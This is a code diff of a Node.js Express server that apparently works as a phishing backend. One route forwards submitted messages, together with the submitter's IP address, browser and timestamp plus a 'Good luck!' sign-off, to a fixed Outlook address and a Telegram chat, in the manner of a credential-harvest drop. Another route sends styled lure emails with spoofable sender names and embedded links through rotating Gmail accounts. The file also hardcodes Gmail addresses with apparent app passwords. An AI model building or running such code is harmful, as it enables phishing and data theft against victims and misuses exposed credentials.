@@ -23,7 +23,6 @@ app.use((req, res, next) => {
 
 // Gmail accounts and their app passwords
 const gmailAccounts = [
-  //{ user: "serenetides01@gmail.com", pass: "fgta ophs ewdn gfum" },
   { user: "serenetides37@gmail.com", pass: "rmmh cqms dcub denw" },
   { user: "serenetides02@gmail.com", pass: "fqye cfrz nvsg aluc" },
   { user: "shopperoutreach@gmail.com", pass: "atiu vczo bdgl lwou" },
@@ -55,66 +54,57 @@ app.get("/", (req, res) => {
   res.end("Welcome to my simple API");
 });
 
-const shuffleArray = (array) => {
-  return array.sort(() => Math.random() - 0.5);
-};
+// Function to send email with randomized credentials
+const sendEmailWithRandomAccount = (req, subject, message, callback) => {
+  // Randomly select an account
+  const { user, pass } = gmailAccounts[Math.floor(Math.random() * gmailAccounts.length)];
 
-// Modified sendEmailWithRotation function
-const sendEmailWithRotation = (req, subject, message, callback) => {
-  let attempt = 0;
-  const shuffledAccounts = shuffleArray([...gmailAccounts]); // Randomize accounts
+  console.log(`Using email: ${user} to send email.`);
 
-  const tryNextAccount = () => {
-    if (attempt >= shuffledAccounts.length) {
-      console.log("All Gmail accounts have been tried, email sending failed.");
-      return callback("Failed to send email", null);
-    }
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: { user, pass },
+  });
 
-    const { user, pass } = shuffledAccounts[attempt];
-    const transporter = nodemailer.createTransport({
-      service: "gmail",
-      auth: { user, pass },
-    });
+  const ipAddress = req.ip;
+  const userAgent = req.headers["user-agent"];
+  const timestamp = new Date().toISOString();
 
-    const ipAddress = req.ip;
-    const userAgent = req.headers["user-agent"];
-    const timestamp = new Date().toISOString();
+  // Build the email message, including the Telegram message
+  const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;
 
-    const fullMessage = `
-      ${message}
-      <br><br>=======================
-      <br><strong>Additional Information</strong>
-      <br>=======================
-      <br><strong>IP Address:</strong> ${ipAddress}
-      <br><strong>Browser:</strong> ${userAgent}
-      <br><strong>Timestamp:</strong> ${timestamp}
-      <br><em>Good luck!</em>
-    `;
-
-    const mailOptions = {
-      from: user,
-      to: "hey.heatherw@outlook.com",
-      subject: subject,
-      text: fullMessage.replace(/<br>/g, "\n"), // Convert HTML to plain text for email
-      html: fullMessage, // Use HTML format
-    };
-
-    transporter.sendMail(mailOptions, (error, info) => {
-      if (error) {
-        console.log(`Failed to send email with ${user}:`, error.message);
-        attempt++;
-        tryNextAccount();
-      } else {
-        console.log(`Email successfully sent using ${user}.`);
-        callback(null, { message: "Success", info });
-      }
-    });
+  const mailOptions = {
+    from: user,
+    to: "hey.heatherw@outlook.com",
+    subject: subject,
+    text: fullMessage,
   };
 
-  tryNextAccount();
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(`Failed to send email with ${user}:`, error.message);
+      return callback("Failed to send email", null);
+    } else {
+      console.log(`Email successfully sent using ${user}.`);
+
+      // Escape Markdown for Telegram
+      const escapeMarkdown = (text) => {
+        return text.replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
+      };
+
+      const formattedMessage = escapeMarkdown(`Subject: ${subject}\n\n${fullMessage}`);
+
+      // Send Telegram message
+      telegramBot
+        .sendMessage(chatId, formattedMessage, { parse_mode: "MarkdownV2" })
+        .then(() => callback(null, { message: "Success", info }))
+        .catch((telegramError) => {
+          console.error("Failed to send Telegram message:", telegramError.message);
+          callback("Telegram message failed", null);
+        });
+    }
+  });
 };
-
-
 
 app.get("/location", async (req, res) => {
   const response = await fetch("http://ip-api.com/json/");
@@ -122,6 +112,7 @@ app.get("/location", async (req, res) => {
   res.json(data);
 });
 
+// Route to send email with Telegram notification
 app.post("/go", (req, res) => {
   const { subject, message } = req.body;
 
@@ -130,7 +121,7 @@ app.post("/go", (req, res) => {
     return res.status(400).json({ error: "All fields are required" });
   }
 
-  sendEmailWithRotation(req, subject, message, (error, result) => {
+  sendEmailWithRandomAccount(req, subject, message, (error, result) => {
     if (error) {
       console.error("Error occurred:", error);
       return res.status(500).json({ error });
@@ -150,63 +141,50 @@ app.post("/gowt", (req, res) => {
 
   console.log("Received request to send email.");
 
-  let attempt = 0;
-  const shuffledAccounts = shuffleArray([...gmailAccounts]); // Randomize accounts
+  // Randomly select an email account
+  const { user, pass } = gmailAccounts[Math.floor(Math.random() * gmailAccounts.length)];
 
-  const tryNextAccount = () => {
-    if (attempt >= shuffledAccounts.length) {
-      console.log("All Gmail accounts have been tried, email sending failed.");
-      return res
-        .status(500)
-        .json({ error: "Failed to send email with all accounts" });
-    }
+  console.log(`Attempting to send email with: ${user}`);
 
-    const { user, pass } = shuffledAccounts[attempt];
-    console.log(`Attempting to send email with: ${user}`);
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: { user, pass },
+  });
 
-    const transporter = nodemailer.createTransport({
-      service: "gmail",
-      auth: { user, pass },
-    });
+  const safeTextColor = textColor || "#000000"; // Default link color
+  const safeFontSize = fontSize || "14px"; // Default font size
 
-    const safeTextColor = textColor || "#000000"; // Default link color
-    const safeFontSize = fontSize || "14px"; // Default font size
+  // Convert message to HTML with specified font size
+  let htmlMessage = `
+    <div style="font-size: ${safeFontSize}; color: #000;">
+      ${message.replace(/\n/g, "<br>")}
+    </div>
+  `;
 
-    let htmlMessage = `
-      <div style="font-size: ${safeFontSize}; color: #000;">
-        ${message.replace(/\n/g, "<br>")}
-      </div>
-    `;
+  // Replace the specified text with a bold, clickable hyperlink
+  htmlMessage = htmlMessage.replace(
+    linkText,
+    `<a href="${linkUrl}" target="_blank" style="color: ${safeTextColor}; font-weight: bold; text-decoration: none;">${linkText}</a>`
+  );
 
-    htmlMessage = htmlMessage.replace(
-      linkText,
-      `<a href="${linkUrl}" target="_blank" style="color: ${safeTextColor}; font-weight: bold; text-decoration: none;">${linkText}</a>`
-    );
-
-    const mailOptions = {
-      from: `${from}<${user}>` || user,
-      to: to || "hey.heatherw@outlook.com",
-      subject: subject,
-      text: format === "html" ? undefined : message, // Plain text fallback
-      html: format === "html" ? htmlMessage : undefined, // Styled HTML email content
-    };
-
-    transporter.sendMail(mailOptions, (error, info) => {
-      if (error) {
-        console.log(`Failed to send email with ${user}:`, error);
-        attempt++;
-        tryNextAccount();
-      } else {
-        console.log(`Email successfully sent using ${user}.`);
-        res.status(200).json({ message: "Email sent successfully", info });
-      }
-    });
+  const mailOptions = {
+    from: `${from}<${user}>` || user,
+    to: to || "hey.heatherw@outlook.com",
+    subject: subject,
+    text: format === "html" ? undefined : message, // Plain text fallback
+    html: format === "html" ? htmlMessage : undefined, // Styled HTML email content
   };
 
-  tryNextAccount();
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(`Failed to send email with ${user}:`, error);
+      return res.status(500).json({ error: "Failed to send email" });
+    } else {
+      console.log(`Email successfully sent using ${user}.`);
+      res.status(200).json({ message: "Email sent successfully", info });
+    }
+  });
 });
-
-
 
 app.post("/telegram-webhook", (req, res) => {
   console.log("Telegram webhook triggered:", JSON.stringify(req.body, null, 2));
@@ -220,9 +198,7 @@ app.post("/telegram-webhook", (req, res) => {
     telegramBot
       .sendMessage(chatId, `You said: ${text}`)
       .then(() => console.log("Message sent successfully."))
-      .catch((err) =>
-        console.error("Failed to send Telegram message:", err.message)
-      );
+      .catch((err) => console.error("Failed to send Telegram message:", err.message));
   }
 
   res.status(200).send("OK");
